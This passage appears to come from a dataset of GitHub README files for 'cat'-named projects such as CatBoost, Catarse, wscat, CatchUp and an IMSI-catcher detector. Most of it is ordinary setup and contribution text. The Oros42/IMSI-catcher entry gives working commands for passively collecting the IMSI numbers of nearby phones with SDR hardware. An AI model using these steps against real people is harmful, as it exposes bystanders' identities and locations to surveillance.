(https://catboost.ai/docs/concepts/loss-functions.html)\nCross-validation\nParameters tuning\nFeature importance calculation\nRegular and staged predictions\n\nCatboost models in production\nIf you want to evaluate Catboost model in your application read model api documentation.\nQuestions and bug reports\n\nFor reporting bugs please use the catboost/bugreport page.\nAsk a question on Stack Overflow with the catboost tag, we monitor this for new questions.\nSeek prompt advice at Telegram group or Russian-speaking Telegram chat\n\nHelp to Make CatBoost Better\n\nCheck out help wanted issues to see what can be improved, or open an issue if you want something.\nAdd your stories and experience to Awesome CatBoost.\nTo contribute to CatBoost you need to first read CLA text and add to your pull request, that you agree to the terms of the CLA. More information can be found\nin CONTRIBUTING.md\nInstructions for contributors can be found here.\n\nNews\nLatest news are published on twitter.\nReference Paper\nAnna Veronika Dorogush, Andrey Gulin, Gleb Gusev, Nikita Kazeev, Liudmila Ostroumova Prokhorenkova, Aleksandr Vorobev \"Fighting biases with dynamic boosting\". arXiv:1706.09516, 2017.\nAnna Veronika Dorogush, Vasily Ershov, Andrey Gulin \"CatBoost: gradient boosting with categorical features support\". Workshop on ML Systems\nat NIPS 2017.\nLicense\n\u00a9 YANDEX LLC, 2017-2019. Licensed under the Apache License, Version 2.0. See LICENSE file for more details."}, {"title": "catarse/catarse", "language": "Ruby", "content": "THIS REPO IS DEPRECATED, PLEASE SEND ALL PULL REQUESTS TO https://github.com/common-group/services-core INSTEAD.\nCatarse\n\n\n\nThe first crowdfunding platform from Brazil\nAn open-source crowdfunding platform for creative projects\nWelcome to Catarse's source code repository.\nOur goal with opening the source code is to stimulate the creation of a community of developers around a high-quality crowdfunding platform.\nYou can see the software in action in http://catarse.me.\nThe official repo is https://github.com/catarse/catarse\nGetting started\nDependencies\nTo run this project you need to have:\n\n\nRuby 2.4.1\n\n\nRails 4.2\n\n\npostgREST 0.3\n\n\nPostgreSQL 9.4\n\nOSX - Postgres.app\nLinux - $ sudo apt-get install postgresql\nWindows - PostgreSQL for Windows\n\nIMPORTANT: Make sure you have postgresql-contrib (Additional Modules) installed on your system.\n\n\nSetup the project\n\n\nClone the project\n  $ git clone https://github.com/catarse/catarse.git\n\n\n\nEnter project folder\n  $ cd catarse\n\n\n\nCreate the database.yml\n  $ cp config/database.sample.yml config/database.yml\n\nYou must do this to configure your local database!\nAdd your database username and password (unless you don't have any).\n\n\nInstall the gems\n  $ bundle install\n\n\n\nInstall the front-end dependencies\n  $ npm install\n\nRequires Node.js and its package manager, npm.\n\n\nCreate and seed the database\n  $ rake db:create db:migrate db:seed\n\n\n\nConfigure the API server\nWe provide authentication through JWT (JSON Web Tokens) and it can be configured by CatarseSettings into rails console.\n  $ bundle exec rails console\n  > CatarseSettings[:api_host] = \"http://localhost:3004\" # postgREST server url\n  > CatarseSettings[:jwt_secret] = \"gZH75aKtMN3Yj0iPS4hcgUuTwjAzZr9C\" # this token is just a valid example\n\n\n\nIf everything goes OK, you can now run the project!\nRunning the project\n\n\nRun API server\nAfter downloading PostgREST 0.3.x you can unpack and run the executable as below.\n  $ ./postgrest postgres://postgrest@localhost/catarse_development -a anonymous --jwt-secret gZH75aKtMN3Yj0iPS4hcgUuTwjAzZr9C -s 1 -p 3004\n\n\n\nRun Rails server\n\n\n$ rails server\nOpen http://localhost:3000\nTranslations\nWe hope to support a lot of languages in the future, so we are willing to accept pull requests with translations to other languages.\nThanks a lot to Daniel Walmsley, from http://purpose.com, for starting the internationalization and beginning the English translation.\nPayment gateways\nCurrently, we support pagarme through our payment engines. Payment engines are extensions to Catarse that implement a specific payment gateway logic.\nIf you have created a different payment engine to Catarse, please contact us so we can link your engine here.\nIf you want to create a payment engine, please join our mailing list at http://groups.google.com/group/catarse-dev\nList of payment enginees that are being developed or need to be developed further\nhttps://github.com/catarse/catarse_pagarme (payment engine used by Catarse.me)\nhttps://github.com/devton/catarse_paypal_express (currently out of date and not maintained)\nhttps://github.com/sushant12/CatarseStripe (just starting to be developed and needs extra hands -- please pitch in...)\n\nHow to contribute with code\nDiscuss your plans in our mailing list (http://groups.google.com/group/catarse-dev).\nAfter that, just fork the project, change what you want, and send us a pull request.\nBest practices (or how to get your pull request accepted faster)\n\nFollow this style guide: https://github.com/bbatsov/ruby-style-guide\nCreate one acceptance tests for each scenario of the feature you are trying to implement.\nCreate model and controller tests to keep 100% of code coverage in the new parts you are writing.\nFeel free to add specs to committed code that lacks coverage ;)\nLet our tests serve as a style guide: we try to use implicit spec subjects and lazy evaluation wherever we can.\n\nCredits\nAuthor: Daniel Weinmann\nContributors: You know who you are ;) The commit history can help, but the list was getting bigger and pointless to keep in the README.\nLicense\nCopyright (c) 2016 Softa\nLicensed under the MIT license (see MIT-LICENSE file)"}, {"title": "websockets/wscat", "language": "JavaScript", "content": "wscat\nWebSocket cat.\nInstallation\nThis module needs to be installed globally so use the -g flag when installing:\nnpm install -g wscat\n\nUsage\n$ wscat -c ws://echo.websocket.org \nconnected (press CTRL+C to quit)\n> hi there\n< hi there\n> are you a happy parrot?\n< are you a happy parrot?\n\nLicense\nMIT"}, {"title": "udacity/ud989-cat-clicker-premium-vanilla", "language": "JavaScript", "content": "Cat Clicker Premium Vanilla\nHere's Ben's solution for Cat Clicker Premium from Udacity's Javascript Design Patterns course.\nClone the repo and open up index.html in your browser of choice."}, {"title": "enigmampc/catalyst", "language": "Python", "content": "Service\nMaster\nDevelop\n\nCI Badge\n\n\n\n\n\nCatalyst is an algorithmic trading library for crypto-assets written in Python.\nIt allows trading strategies to be easily expressed and backtested against\nhistorical data (with daily and minute resolution), providing analytics and\ninsights regarding a particular strategy's performance. Catalyst also supports\nlive-trading of crypto-assets starting with four exchanges (Binance, Bitfinex, Bittrex,\nand Poloniex) with more being added over time. Catalyst empowers users to share\nand curate data and build profitable, data-driven investment strategies. Please\nvisit catalystcrypto.io to learn more about Catalyst.\nCatalyst builds on top of the well-established\nZipline project. We did our best to\nminimize structural changes to the general API to maximize compatibility with\nexisting trading algorithms, developer knowledge, and tutorials. Join us on the\nCatalyst Forum for questions around Catalyst,\nalgorithmic trading and technical support. We also have a\nDiscord group with the #catalyst_dev and\n#catalyst_setup dedicated channels.\n\nOverview\n\nEase of use: Catalyst tries to get out of your way so that you can\nfocus on algorithm development. See\nexamples of trading strategies\nprovided.\nSupport for several of the top crypto-exchanges by trading volume:\nBitfinex, Bittrex,\nPoloniex and Binance.\nSecure: You and only you have access to each exchange API keys for your accounts.\nInput of historical pricing data of all crypto-assets by exchange,\nwith daily and minute resolution. See\nCatalyst Market Coverage Overview.\nBacktesting and live-trading functionality, with a seamless transition\nbetween the two modes.\nOutput of performance statistics are based on Pandas DataFrames to\nintegrate nicely into the existing PyData eco-system.\nStatistic and machine learning libraries like matplotlib, scipy,\nstatsmodels, and sklearn support development, analysis, and\nvisualization of state-of-the-art trading systems.\nAddition of Bitcoin price (btc_usdt) as a benchmark for comparing\nperformance across trading algorithms.\n\nGo to our Documentation Website."}, {"title": "catapult-project/catapult", "language": "HTML", "content": "Catapult\nCatapult is the home for several performance tools that span from gathering,\ndisplaying and analyzing performance data. This includes:\n\nTrace-viewer\nTelemetry\nPerformance Dashboard\nSystrace\nWeb Page Replay\n\nThese tools were created by Chromium developers for performance analysis,\ntesting, and monitoring of Chrome, but they can also be used for analyzing and\nmonitoring websites, and eventually Android apps.\nContributing\nPlease see our contributor's guide\nCurrent build status"}, {"title": "cesarferreira/CatKit", "language": "Java", "content": "CatKit\n\nAndroid kit for cat placeholders\n\n\n\n\nUsage\nWith Density-independent Pixels:\nCatKit.with(context)\n        .dp(200, 200)\n        .into(targetImageView);\nWith Pixels:\nCatKit.with(context)\n        .px(500, 300)\n        .into(targetImageView);\nMemory Policy:\nCatKit.with(context)\n        .dp(200, 200)\n        .memoryPolicy(MemoryPolicy.NO_CACHE)\n        .into(targetImageView);\nInstall\nAdd the dependency to your build.gradle\ndependencies {\n  compile 'com.cesarferreira.catkit:catkit:0.3.0'\n}\nContributing\n\nFork it ( https://github.com/cesarferreira/catkit/fork )\nCreate your feature branch (git checkout -b my-new-feature)\nCommit your changes (git commit -am 'Add some feature')\nPush to the branch (git push origin my-new-feature)\nCreate a new Pull Request"}, {"title": "Rogero0o/CatLoadingView", "language": "Java", "content": "Android CatLoadingView\nThis project idea is from Link.\nThanks for the idea.\nI like the animation in this picture:\n\n...as you see it right now, I hope you like it!\nStep\nImport this project into Android Studio... it's built with it.\nUsage\nGradle\nimplementation 'com.roger.catloadinglibrary:catloadinglibrary:1.0.4'\n\nconfig in java code\nCatLoadingView mView;\n\n\n@Override protected void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.activity_main);\n    \n    mView = new CatLoadingView();\n    findViewById(R.id.button).setOnClickListener(\n            new View.OnClickListener() {\n                @Override public void onClick(View v) {\n                    mView.show(getSupportFragmentManager(), \"\");\n                }\n            });\n}\n\nSet Background Color\n\tmView.setBackgroundColor(Color.parseColor(\"#000000\"));\nTODO\nThis view is adjusted in Nexus5 but not tested on other screen sizes.\nAbout me\nA small guy in Fujian, mainland China.\nIf you have any new ideas about this project, feel free to tell me. Tks. \ud83d\ude03\nLicense\nThe MIT License (MIT)\n\nCopyright \u00a9 2015 Roger\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE."}, {"title": "CellularPrivacy/Android-IMSI-Catcher-Detector", "language": "Java", "content": "Android IMSI-Catcher Detector\n\n\n\n\n\n\n\n\n \nThis Project will have a revival soon. \nWe are working on a light version of AIMSICD.\nmore information\n\nAIMSICD is an Android app to detect IMSI-Catchers. These devices are false mobile towers (base stations) acting between the target mobile phone(s) and the real towers of service providers. As such they are considered a Man-In-The-Middle (MITM) attack. This surveillance technology is also known as \"StingRay\", \"Cellular Interception\" and alike. Find out more in our Wiki on GitHub.\n\n\n\n\n\n\n\n\n\n\n\n\n\nIndex\n\nWhat it does\nWhy use it\nContributing\nBug Tracker\nWarnings\nResearch\nSupport\nContact\nWiki\nFAQ\n\n\n\nWhat it does\nAIMSICD attempts to detect IMSI-Catchers through detection methods such as these:\n\nCheck Tower Information Consistency\nCheck LAC/Cell ID Consistency\nCheck Neighboring Cell Info\nPrevent silent app installations\nMonitor Signal Strength\nDetect silent SMS\nDetect FemtoCells\n\nMake sure to see our app goals and development status as well as technical overview.\n\nWhy use it\nThe FBI or local police regularly deploys IMSI-Catchers hidden in vehicles at protests to obtain a record of everyone who attended with a cell phone (leave your phones at home by all means if you really have to attend). IMSI-Catchers also allow adversaries to intercept your conversations, text messages, and data. Police can use them to determine your location or to find out who is in a given geographic area at what time. Identity thieves can use freely available tools and even build their own rogue GSM BTS to monitor and manipulate communications from a parked car in your residential neighborhood - notably for stealing passwords or credit card data from people nearby who make purchases on their phones. The reason IMSI-Catchers are so commonly used is that it is very easy to get away with using them since they leave no traces. Our app aims to make it possible to detect the IMSI-Catchers so that using them becomes a risky proposition. It also aims to make users safer by alerting on possible interception and tracking. Fight for your privacy!\n\nWarnings\n\nPlease read our Disclaimer! This app does not:\n\nProvide secure phone calls\nProvide secure data transmission\nProvide app permission control\nProvide secure application sand-boxing\nProvide ROOT and remove bloatware\nProvide secure SMS\nProvide firewalls\nProvide full device encryption\nPrevent already installed rogue apps from full access and spying\n\nSolutions for the above may be found in our Recommendations.\n\nBug Tracker\nPlease follow our Bug Submission Guide.\n\nSupport\nAlthough our app is fully Open Source, developing it is a lot of work and done by privacy enthusiasts during their free time. If you're a developer yourself, we welcome and credit your pull requests! To keep developers in a great mood and support development, please consider making a donation. It will be split into pieces and directly sent to developers who solved the backed Issue.\n\nLicense\n\nPlease contribute to this repository instead of rebranding our app. Thank you!"}, {"title": "ZacSweers/CatchUp", "language": "Kotlin", "content": "CatchUp\nAn app for catching up on things.\nhttps://medium.com/@sweers/catching-up-on-catchup-introduction-7581c099f4bc\nMotivations\nThere's a lot of services I like reading up on throughout the day. Most of these services have\ndedicated apps for consuming them, but often times I just want to skim the front page and only deep\ndive occasionally. Enter CatchUp: a high level presentation of the \"front page\" of several services\nin short form, and intelligent deeplinking into dedicated apps if you want to go further.\nCatchUp is not an all-purpose client for each of these services, just the concierge for at-a-glance\ndetails and router for getting on your way. It does not support login for any service, it does not\nsupport customization/filtering of their feed. CatchUp is dumb, and you should use one of the many\ngreat dedicated apps for this if you want more integration features.\nCatchUp is also very much a testing ground for things I personally dive into, from architecture,\nlibraries, patterns, API quirks, and more. It's been a very fun project to spike test new things.\nFeatures\n\nMultiple services\n\nHacker News\nReddit\nMedium\nProduct Hunt\nSlashdot\nDesigner News\nDribbble\nGitHub\n\n\nInfinite scrolling on supported services\nPleasant, simple, consistent UI for across services\nNight mode\nSmart deeplinking into dedicated apps\n\nTechnologies\n\nKotlin\nRxJava 2/AutoDispose\nDebugging tooling as a first class citizen in the debug build\n\nLeak Canary, Chuck, Scalpel, debug drawer, Stetho, bug reporting, the works\n\n\nAndroidX/Jetpack\nDagger 2\n\nOne of the more interesting parts of CatchUp is that its service architecture is a Dagger-powered plugin system\n\n\nRoom (Arch components)\nAutoValue + extensions\nFirebase\nGlide\nApollo GraphQL\nStandard Square buffet of Okio/OkHttp 3/Retrofit 2/Moshi\nThreetenABP\nInspector\n\nThere's a lot of neat/interesting little tidbits in the CatchUp source code that I plan to write a\nmini blog series about. Each service has its own nuances that make them unique to work with in code.\nTesting\nWhile this is a personal pet project, extensive tests can be found here.\nInfluences\nThis app owes a lot of its inspiration, implementation details, and general inner workings to the\nwork of others. Particularly:\n\nNick Butcher and his Plaid app\nJake Wharton and his u2020 demo app\n\nDownload\nCatchUp is in open alpha, but master tends to be rather far ahead of what's on the Play Store.\n\n\n\nDevelopment\nIf you'd like to build CatchUp locally, you should be able to just clone and build with no issues.\nCatchUp tends to keep up with Android Studio canaries, so you may have to use a canary version.\nCheck the Android Gradle Plugin deps.android.gradlePlugin dependency in gradle/dependencies.kt.\nIf you want to build with working services, some require API keys. See the\nwiki for more details on\nwhich services require keys.\nBug fixes are always welcome. Tests are too if you're into that kinda thing, but I'm not actively\ntrying to make this project a shining icon of TDD. For new features or otherwise significant work,\nplease discuss in an issue first.\nNote that by default, I have a Timber tree that crashes the app in the event of an error in debug\n(fix me now!). This may be problematic if you don't have services authenticated (especially Firebase\nand its ever shifting requirements), so you can disable this behavior via setting the catchup.crashOnTimberError\nproperty in the root gradle.properties file to false.\nFor apollo-android's code generation: if you want to use a local installation of the apollo-codegen\nnode module you'll need to make sure 0.19. is installed and linked (npm install -g apollo-codegen@0.19.1). Otherwise,\nthe gradle plugin should gracefully fallback to downloading it on demand.\nLicense\nCopyright (C) 2017 Zac Sweers\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n   http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."}, {"title": "awgn/cat", "language": "C++", "content": "Cat: C++14/17 functional library\nWhat is cat?\nCat is a C++14/17 functional library inspired by category theory\nand Haskell language.\nThe purpose of cat is to provide utility functions and type classes\nto enable the functional programming paradigm in C++.\nRationale\nThe purpose of Cat library is twofold:\n\nto provide utility classes and functions that enable the functional programming paradigm in C++.\nto implement an extensible framework of type classes to attain a better reusability of code\nthrough the principles of category theory.\n\nFeatures\nThe Cat library:\n\n\nis lightweight. Each function and object shipped with the library\ntakes advantage of modern C++ features, such as constexpr constructs, movability,\nperfect forwarding, etc.\n\n\nis written in portable C++14/17 without macro black-magic, whereas\ntemplate meta-programming is restricted only to the implementation of type traits.\n\n\nimplements type traits tailored for generic and functional programming (e.g. is_container,\nis_associative_container, function_type, function_arity, return_type, is_callable to mention a few).\n\n\nprovides utilities, like callable wrappers, which enable functional composition and\ncurrying on-top-of any kind of callable types (including std::bind expressions\nand generic lambdas).\n\n\nprovides functions that operate on std::tuple and generic containers.\n\n\nprovides utilities that enable perfect forwarding from L/R value containers\nby means of forward_as and forward_iterator.\n\n\nincludes an extensible framework for building type classes and provides the\nimplementation of the following ones:\n\nFunctor\nBifunctor\nApplicative\nAlternative\nMonoid\nMonad\nMonadPlus\nFoldable\nShow\nRead\n...\n\n\n\nincludes instances of standard C++14/17 and Technical Specification (TS) containers/types for the above-mentioned type classes.\n\n\nNotes\nAt the present moment the Cat library is tested under Linux and MacOS with both glibcxx and libc++\nlibrary and with the following compilers:\n\ngcc-4.9\ngcc-5\ngcc-6.3\ngcc-8\nclang-3.5\nclang 3.6\nclang 6.0\n\nAcknowledgements\nThe Cat library takes inspiration from the following projects:\n\nThe Haskell language\nFit library by Paul Fultz II\nFTL library by Bjorn Aili"}, {"title": "mattsears/nyan-cat-formatter", "language": "Ruby", "content": "Nyan Cat RSpec Formatter \n\nThis is my take on the Nyan Cat RSpec Formatter. It simply creates a rainbow trail of test results. It also counts the number of examples as they execute and highlights failed and pending specs.\nThe rainbow changes colors as it runs. See it in action here.\nWorks with RSpec 1.3, 2 and 3.\nUsing  Nyan Cat\nYou can either specify the formatting when using the rspec command:\nrspec --format NyanCatFormatter\n\nOr add --format NyanCatFormatter to a .rspec file placed in your project's root directory,\nso that you won't have to specify the --format option everytime you run the command.\n###Using with Bundler\nTo use Nyan Cat with a project that uses Bundler (Rails or Sinatra f.e.) you need to add Nyan Cat dependecy to your Gemfile:\ngroup :test do\n  gem \"nyan-cat-formatter\"\nend\nAnd then run bundle install.\nInstalling it\n$ gem install nyan-cat-formatter\n\nIf you want to use Nyan Cat as your default formatter, simply put the options in your .rspec file:\n--format NyanCatFormatter\n\nPlaying the Nyan Cat song\nYou can then enjoy playback in two ways:\n1. Play the song only when desired using a command line option:\nUse the following command to run your specs:\n$ rspec spec -f NyanCatMusicFormatter\n\nAnd enjoy the site of Nyan Cat running across your terminal to the Nyan Cat song!\n2. Play the song by default when you run your specs:\nMake sure your .rspec file in your application's root directory contains the following:\n--color\n--format NyanCatMusicFormatter\n\nThen run rspec spec and enjoy Nyan Cat formatted text output accompanied by the Nyan Cat song by default!\nThis currently only works on Mac OS X or on Linux (if you have mpg321 or mpg123 installed).\nUsing the Nyan Cat Wide Formatter\nThe classic Nyan Cat Formatter uses a terminal column per test. One\ntest, and single step that the cat goes ahead. The Nyan Cat Wide\nFormatter, instead, uses the whole terminal width, so the cat will\nalways end up reaching the end of the terminal.\nSimple use it by configuring it as the RSpec formatter:\n--format NyanCatWideFormatter\n\nContributing\nOnce you've made your great commits:\n\nFork Nyan Cat\nCreate a topic branch - git checkout -b my_branch\nPush to your branch - git push origin my_branch\nCreate a Pull Request from your branch\nThat's it!\n\nAuthor\nMatt Sears :: @mattsears"}, {"title": "rancher/community-catalog", "language": "Smarty", "content": "Rancher Community Catalog\nThis catalog provides templates created by the community, and they are not maintained or supported by Rancher Labs.\nLicense\nCopyright (c) 2014-2017 Rancher Labs, Inc.\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."}, {"title": "Oros42/IMSI-catcher", "language": "Python", "content": "IMSI-catcher\nThis program shows you IMSI numbers, country, brand and operator of cellphones around you.\n/!\\ This program was made to understand how GSM network work. Not for bad hacking !\n\nWhat you need\n1 PC\n1 USB DVB-T key (RTL2832U) with antenna (less than 15$) or a OsmocomBB phone   or HackRF\nSetup\ngit clone https://github.com/Oros42/IMSI-catcher.git\n# or wget https://github.com/Oros42/IMSI-catcher/archive/master.zip && unzip -q master.zip\n\nsudo apt install python-numpy python-scipy python-scapy\n\nFor Debian Testing (10) and Ubuntu 18.04+ :\nSee https://osmocom.org/projects/gr-gsm/wiki/Installation\nFor older Debian and Ubuntu :\nsudo add-apt-repository -y ppa:ptrkrysik/gr-gsm\nsudo apt update\nsudo apt install gr-gsm\n\nIf gr-gsm failled to setup. Try this setup : https://github.com/ptrkrysik/gr-gsm/wiki/Installation\nDebian : https://tracker.debian.org/pkg/gr-gsm\nRun\nWith an old version of gr-gsm\nOpen 2 terminals.\nIn terminal 1\nsudo python simple_IMSI-catcher.py --sniff\n\nYou can add -h to display options.\nIn terminal 2, search a frequency to listen :\ngrgsm_scanner\n\nNext, ask grgsm_livemon to use one of these frequencies:\ngrgsm_livemon -f <your_frequency>M\n\nExample :\ngrgsm_livemon -f 938.2M\n\nIt should start producing output like :\n15 06 21 00 01 f0 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b\n25 06 21 00 05 f4 f8 68 03 26 23 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b\n49 06 1b 95 cc 02 f8 02 01 9c c8 03 1e 57 a5 01 79 00 00 1c 13 2b 2b\n...\n\nYou can change the frequency if you want.\nWith version of gr-gsm >= 0.41.2-1\nOpen 2 terminals.\nIn terminal 1\npython simple_IMSI-catcher.py\n\nYou can add -h to display options.\nIn terminal 2\npython scan-and-livemon\n\nThis step can take a few minutes to get started, as it first run\ngrgsm_scanner to find nearby base stations and ask\ngrgsm_livemon_headless to receive the signal from the strongest\nsignals.\nOr first find the frequencies of the nearby base stations.\ngrgsm_scanner\n\nNext, ask grgsm_livemon to use one of these frequencies:\ngrgsm_livemon -f <your_frequency>M\n\nExample :\ngrgsm_livemon -f 938.2M\n\nIt should start producing output like :\n15 06 21 00 01 f0 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b\n25 06 21 00 05 f4 f8 68 03 26 23 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b\n49 06 1b 95 cc 02 f8 02 01 9c c8 03 1e 57 a5 01 79 00 00 1c 13 2b 2b\n...\n\nYou can change the frequency if you want.\nFor all\nNow, watch terminal 1 and wait. IMSI numbers should appear :-)\nIf nothing appears after 1 min, change the frequency.\nDoc : https://fr.wikipedia.org/wiki/Global_System_for_Mobile_Communications\nExample of frequency in France : 9.288e+08 Bouygues\nYou can watch GSM packets with\nsudo wireshark -k -Y '!icmp && gsmtap' -i lo\n\nOptional\nInformation about the cell tower :\nsudo python find_cell_id.py\n\nGet immediate assignment :\nsudo python immediate_assignment_catcher.py\n\nFind frequencies\nYou can either use the grgsm_scanner program from gr-gsm mentioned\nabove, or fetch the kalibrate-hackrf tool like this:\nsudo apt-get install automake autoconf libhackrf-dev\ngit clone https://github.com/scateu/kalibrate-hackrf\ncd kalibrate-hackrf/\n./bootstrap\n./configure\nmake\nsudo make install\n\nRun\nkal -s GSM900\n\nkal: Scanning for GSM-900 base stations.\nGSM-900:\n\tchan:   14 (937.8MHz + 10.449kHz)\tpower: 3327428.82\n\tchan:   15 (938.0MHz + 4.662kHz)\tpower: 3190712.41\n...\n\nLinks\nSetup of Gr-Gsm : https://github.com/ptrkrysik/gr-gsm/wiki/Installation\nFrequency : http://www.worldtimezone.com/gsm.html and https://fr.wikipedia.org/wiki/Global_System_for_Mobile_Communications\nMobile Network Code : https://en.wikipedia.org/wiki/Mobile_Network_Code\nScapy : http://secdev.org/projects/scapy/doc/usage.html\nIMSI : https://fr.wikipedia.org/wiki/IMSI\nRealtek RTL2832U : https://osmocom.org/projects/sdr/wiki/rtl-sdr and http://doc.ubuntu-fr.org/rtl2832u and http://doc.ubuntu-fr.org/rtl-sdr"}, {"title": "Catrobat/Catroid", "language": "Java", "content": "Catroid\nCatroid, also known as Pocket Code, is an on-device visual programming system for Android devices.\nCatrobat is a visual programming language and a set of creativity tools for smartphones, tablets, and mobile browsers.\nCatrobat programs can be written by using the Catroid programming system on Android phones and tablets.\nFor more information [oriented towards developers], check out our developers page.\nIssues\nFor reporting issues use our JIRA Bugtracking System. Before, please browse our currently open issues here.\nContributing\nIf you want to contribute we suggest that you start with forking our repository and browse the code. Then you can look at our Issue-Tracker and start with fixing one ticket. We strictly use Test-Driven Development and Clean Code, so first read everything you can about these development methods. Code developed in a different style will not be accepted.\nAfter you've created a pull request we will review your code and do a full testrun on your branch.\nIf you want to implement a new feature, please ask about the details on http://catrob.at/mailinglist\nStart setting up the working environment by following the instructions: https://github.com/Catrobat/Catroid/wiki/Setup-working-environment\nAlso make sure to read our guidelines for creating a pull request\nResources and links\n\nGoogle Play Store Download\nCommunity website with sample programs\nInstallation Instructions\nFrequently Asked Questions\nCredits\nStatistics on OpenHub\nTwitter\nGoogle+\nFacebook\nOur Google group\n\nLicense\nLicense of our project (mainly AGPL v3)."}, {"title": "junyanz/CatPapers", "language": "HTML", "content": "Cat Paper Collection\nAs reported by Cisco, 90% of net traffic will be visual, and indeed, most of the visual data are cat photos and videos. Thus, understanding, modeling, and synthesizing our feline friends becomes a more and more critical research problem these days, especially for our cat lovers.\nCat Paper Collection is an academic paper collection that includes computer graphics, computer vision, machine learning, and HCI papers that produce experimental results related to cats. If you want to add/remove an article, please send an email to Jun-Yan Zhu (junyanz at mit dot edu).\nSee also Webpage | CSV file\n\n   \n\nThe relativistic discriminator: a key element missing from standard GAN\nAlexia Jolicoeur-Martineau\nIn arXiv 2018\n[Paper]\n[Project]\n\n   \n\nDSCarver: Decompose-and-Spiral-Carve for Subtractive Manufacturing\nHaisen Zhao, \nHao Zhang, \nShiqing Xin, \nYuanmin Deng, \nChanghe Tu, \nWenping Wang, \nDaniel Cohen-Or, \nBaoquan Chen\nIn SIGGRAPH 2018\n[Paper]\n[Project]\n\n   \n\nNeural Best-Buddies: Sparse Cross-Domain Correspondence\nKfir Aberman, \nJing Liao, \nMingyi Shi, \nDani Lischinski, \nBaoquan Chen, \nDaniel Cohen-Or\nIn SIGGRAPH 2018\n[Paper]\n[Project]\n\n   \n\nInteractive Curve Constrained Functional Maps\nAnne Gehre, \nMichael Bronstein, \nLeif Kobbelt, \nJustin Solomon\nIn SGP 2018\n[Paper]\n\n   \n\nAdversarial Examples that Fool both Computer Vision and Time-Limited Humans\nGamaleldin F. Elsayed, \nShreya Shankar, \nBrian Cheung, \nNicolas Papernot, \nAlex Kurakin, \nIan Goodfellow, \nJascha Sohl-Dickstein\nIn NeurIPS 2018\n[Paper]\n\n   \n\nA Neural Representation of Sketch Drawings\nDavid Ha, \nDouglas Eck\nIn ICLR 2018\n[Paper]\n\n   \n\nImproving Shape Deformation in Unsupervised Image-to-Image Translation\nAaron Gokaslan, \nVivek Ramanujan, \nDaniel Ritchie, \nKwang In Kim, \nJames Tompkin\nIn ECCV 2018\n[Paper]\n[Project]\n\n   \n\nMultimodal UNsupervised Image-to-image Translation\nXun Huang, \nMing-Yu Liu, \nSerge Belongie, \nJan Kautz\nIn ECCV 2018\n[Paper]\n[Project]\n\n   \n\nAn Efficient and Practical Near and Far Field Fur Reflectance Model\nLing-Qi Yan, \nHenrik Wann Jensen, \nRavi Ramamoorthi\nIn SIGGRAPH 2017\n[Paper]\n\n   \n\nLight Field Video Capture Using a Learning-Based Hybrid Imaging System\nTing-Chun Wang, \nJun-Yan Zhu, \nNima Khademi Kalantari, \nAlexei A. Efros, \nRavi Ramamoorthi\nIn SIGGRAPH 2017\n[Paper]\n[Project]\n\n   \n\nUnsupervised Image-to-Image Translation Networks\nMing-Yu Liu, \nThomas Breuel, \nJan Kautz\nIn NIPS 2017\n[Paper]\n[Project]\n\n   \n\nUnpaired Image-to-Image Translation using Cycle-Consistent Adversarial Networks\nJun-Yan Zhu*, \nTaesung Park*, \nPhillip Isola, \nAlexei A. Efros\nIn ICCV 2017\n[Paper]\n[Project]\n\n   \n\nUnsupervised learning of object landmarks by factorized spatial embeddings\nJames Thewlis, \nHakan Bilen, \nAndrea Vedaldi\nIn ICCV 2017\n[Paper]\n\n   \n\nImage-to-Image Translation with Conditional Adversarial Networks\nPhillip Isola, \nJun-Yan Zhu, \nTinghui Zhou, \nAlexei A. Efros\nIn CVPR 2017\n[Paper]\n[Project]\n\n   \n\nLearning Features by Watching Objects Move\nDeepak Pathak, \nRoss Girshick, \nPiotr Dollar, \nTrevor Darrell, \nBharath Hariharan\nIn CVPR 2017\n[Paper]\n\n   \n\nCodePilot: Scaffolding End-to-End Collaborative Software Development for Novice Programmers\nJeremy Warner, \nPhilip J. Guo\nIn CHI 2017\n[Paper]\n[Project]\n\n   \n\nRevolt: Collaborative Crowdsourcing for Labeling Machine Learning Datasets\nJoseph Chee Chang, \nSaleema Amershi, \nEce Kamar\nIn CHI 2017\n[Paper]\n[Project]\n\n   \n\nBijective Maps from Simplicial Foliations\nMarcel Campen, \nClaudio T. Silva, \nDenis Zorin\nIn SIGGRAPH 2016\n[Paper]\n\n   \n\nConnected Fermat Spirals for 